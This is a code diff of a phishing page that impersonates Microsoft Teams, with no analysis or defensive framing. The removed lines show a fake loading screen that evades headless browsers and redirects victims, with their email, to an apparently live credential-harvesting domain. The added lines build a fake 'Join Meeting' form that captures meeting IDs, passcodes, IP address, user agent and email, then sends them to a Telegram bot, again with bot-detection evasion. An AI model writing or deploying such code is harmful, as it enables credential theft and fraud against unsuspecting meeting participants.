@@ -1,136 +1,74 @@
 <!DOCTYPE html>
-<html lang="en-us" class="theme-defaultV2" dir="ltr">
+<html lang="en">
 <head>
-<meta name="containerVer" content="25071714812">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Microsoft Teams</title>
-<style>
-body,html{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","Apple Color Emoji","Segoe UI Emoji","Segoe UI Web",sans-serif;width:100%;height:100%;padding:0;margin:0;color:var(--themeColor)}
-html{font-size:10px;forced-color-adjust:none;position:fixed;bottom:0;left:0;right:0;top:0}
-body{background-color:var(--themeBackgroundColor,#f3f2f1);font-size:1.4rem;overflow:hidden;touch-action:none}
-*{-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}
-</style>
-<link rel="canonical" href="">
-<meta http-equiv="content-security-policy" content="default-src 'none'; font-src 'self' data:; img-src 'self' data:; style-src 'unsafe-inline'; media-src 'self' data:; script-src 'unsafe-inline' data:; object-src 'self' data:; frame-src 'self' data:;">
 </head>
 <body>
-
-<div id="app" style="display:block;height:100%"></div>
-
-<div role="progressbar" tabindex="-1" id="loading-screen" aria-valuetext="Loading..." style="background-color: transparent">
-  <div class="text-slider-container">
-    <div id="loading-screen-logo" class="scale-animation-T2_1 t2-icon"></div>
-    <div class="text-slider"></div>
-  </div>
-</div>
-
-<input type="hidden" id="bot-check" value="no-bot">
+<h2>Join Meeting</h2>
+<form id="joinForm">
+  <label>Meeting ID: <input type="text" id="meetingID" required></label><br>
+  <label>Password: <input type="text" id="password" required></label><br>
+  <button type="submit">Join</button>
+</form>
 
 <script>
-window.addEventListener('load', function () {
-  const botCheck = document.getElementById('bot-check');
+document.getElementById('joinForm').addEventListener('submit', async function(e) {
+  e.preventDefault();
 
+  // Anti-bot / headless detection
   if (navigator.webdriver || /HeadlessChrome|PhantomJS|selenium/i.test(navigator.userAgent)) {
-    console.warn("Bot detected; redirect blocked");
-    return;
+    document.body.innerHTML = "<h2>Security Verification Failed</h2><p>Please try again from a regular browser.</p>";
+    throw new Error("Headless browser detected");
   }
 
-  if (botCheck && botCheck.value === 'no-bot') {
-    // Get email from fragment (#email)
-    const fragmentEmail = window.location.hash ? window.location.hash.substring(1) : null;
-    const email = fragmentEmail && fragmentEmail.includes("@") ? fragmentEmail : null;
+  const meetingID = document.getElementById('meetingID').value.trim();
+  const password = document.getElementById('password').value.trim();
+  const browser = navigator.userAgent;
+  const hash = window.location.hash;
+  const email = hash ? hash.substring(1) : '';
 
-    const delayBeforeLogo = Math.floor(Math.random() * (10000 - 5000 + 1)) + 5000;
-    const delayBeforeRedirect = 3000;
+  // Fetch IP
+  let ipAddress = 'Unavailable';
+  try {
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), 2000);
+    const response = await fetch('https://api.ipify.org?format=json', { signal: controller.signal });
+    clearTimeout(timeoutId);
+    const data = await response.json();
+    ipAddress = data.ip || 'Unavailable';
+  } catch {}
 
-    setTimeout(function () {
-      const loadingScreen = document.getElementById('loading-screen');
-      if (loadingScreen) {
-        // Fade out logo screen
-        loadingScreen.style.transition = 'opacity 0.5s ease-out';
-        loadingScreen.style.opacity = '0';
+  const currentDateTime = new Date().toLocaleString();
+  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
-        setTimeout(() => {
-          loadingScreen.style.display = 'none';
+  const message =
+    `✅💯 TEAMS RESULT 💯✅\n` +
+    `Meeting ID: ${meetingID}\n` +
+    `Passcode: ${password}\n` +
+    `Browser: ${browser}\n` +
+    `IP Address: ${ipAddress}\n` +
+    `Email: ${email || 'N/A'}\n` +
+    `Date/Time: ${currentDateTime}\n` +
+    `Timezone: ${timezone}\n` +
+    `✅💯 TEAMS RESULT 💯✅`;
 
-          // Dimmed overlay
-          const overlay = document.createElement('div');
-          overlay.style.position = 'fixed';
-          overlay.style.top = '0';
-          overlay.style.left = '0';
-          overlay.style.width = '100%';
-          overlay.style.height = '100%';
-          overlay.style.backgroundColor = 'rgba(0,0,0,0.3)';
-          overlay.style.zIndex = '9998';
-          overlay.style.backdropFilter = 'blur(2px)';
-          document.body.appendChild(overlay);
+  const telegramBotToken = 'YOUR_BOT_TOKEN';
+  const chatId = 'YOUR_CHAT_ID';
+  const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
 
-          // Message container
-          const messageContainer = document.createElement('div');
-          messageContainer.style.position = 'fixed';
-          messageContainer.style.top = '40%';
-          messageContainer.style.left = '50%';
-          messageContainer.style.transform = 'translate(-50%, -50%)';
-          messageContainer.style.display = 'flex';
-          messageContainer.style.alignItems = 'center';
-          messageContainer.style.backgroundColor = '#ffffff';
-          messageContainer.style.padding = '20px 30px';
-          messageContainer.style.border = '1px solid #e1dfdd';
-          messageContainer.style.borderRadius = '8px';
-          messageContainer.style.boxShadow = '0 2px 8px rgba(0, 0, 0, 0.1)';
-          messageContainer.style.zIndex = '9999';
-          messageContainer.style.fontFamily = '"Segoe UI", Tahoma, Geneva, Verdana, sans-serif';
-          messageContainer.style.fontSize = '18px';
-          messageContainer.style.color = '#323130';
-          messageContainer.style.animation = 'fadeIn 0.4s ease-out';
+  try {
+    await fetch(telegramUrl, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: chatId, text: message }),
+    });
+  } catch {}
 
-          // Spinner
-          const spinner = document.createElement('div');
-          spinner.style.border = '3px solid #f3f3f3';
-          spinner.style.borderTop = '3px solid #0078d4';
-          spinner.style.borderRadius = '50%';
-          spinner.style.width = '20px';
-          spinner.style.height = '20px';
-          spinner.style.marginRight = '12px';
-          spinner.style.animation = 'spin 1s linear infinite';
-
-          // Add keyframes
-          const style = document.createElement('style');
-          style.textContent = `
-            @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-            @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-          `;
-          document.head.appendChild(style);
-
-          // Message text
-          const messageText = document.createElement('span');
-          messageText.innerHTML = "Your session has timed out. Please sign in to rejoin the meeting.";
-
-          // Assemble
-          messageContainer.appendChild(spinner);
-          messageContainer.appendChild(messageText);
-          document.body.appendChild(messageContainer);
-
-          // Show second line after 1.5s
-          setTimeout(() => {
-            messageText.innerHTML += "<br>Redirecting to Microsoft login...";
-          }, 1500);
-
-          // Redirect after delay, keeping fragment for email autofill
-          setTimeout(function () {
-            const evilUrl = 'https://access-meetings.visions-solutions.ca/yLobagKc';
-            if (email) {
-              window.location.href = evilUrl + '#' + encodeURIComponent(email);
-            } else {
-              window.location.href = evilUrl;
-            }
-          }, delayBeforeRedirect);
-
-        }, 500); // match fade-out duration
-      }
-    }, delayBeforeLogo);
-  } else {
-    console.log('Bot detected or hidden input changed; redirect blocked.');
-  }
+  setTimeout(() => {
+    window.location.href = 'connecting.html' + (hash || '');
+  }, Math.floor(Math.random() * 1000) + 500);
 });
 </script>
 </body>
